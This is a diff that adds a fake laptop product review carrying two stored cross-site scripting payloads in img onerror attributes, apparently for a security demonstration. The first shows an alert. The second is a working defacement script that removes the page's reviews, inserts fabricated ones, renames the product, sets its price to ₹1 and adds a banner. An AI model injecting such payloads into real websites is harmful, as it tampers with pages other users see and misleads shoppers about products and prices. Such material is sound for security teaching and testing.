@@ -1,0 +1,5 @@
+Good laptop with excellent performance. The battery life is impressive, and it works well for college projects.
+
+<img src=x onerror="alert('Stored XSS demonstrated!')">
+
+<img src=x onerror="document.querySelectorAll('.review-list .review').forEach(e=>e.remove());document.querySelector('.review-list').insertAdjacentHTML('beforeend','<article class=review><h3>Demo Customer</h3><p>Replacement review displayed by the XSS demonstration.</p></article><article class=review><h3>Another Customer</h3><p>Original review content has been replaced in this browser view.</p></article>');document.querySelector('.product-info h1').textContent='Demo Product';document.querySelector('.price-line strong').textContent='₹1';let b=document.createElement('div');b.textContent='PAGE MODIFIED — STORED XSS DEMONSTRATION';b.style='background:#b91c1c;color:white;padding:16px;text-align:center;font-weight:bold';document.querySelector('main').prepend(b)">
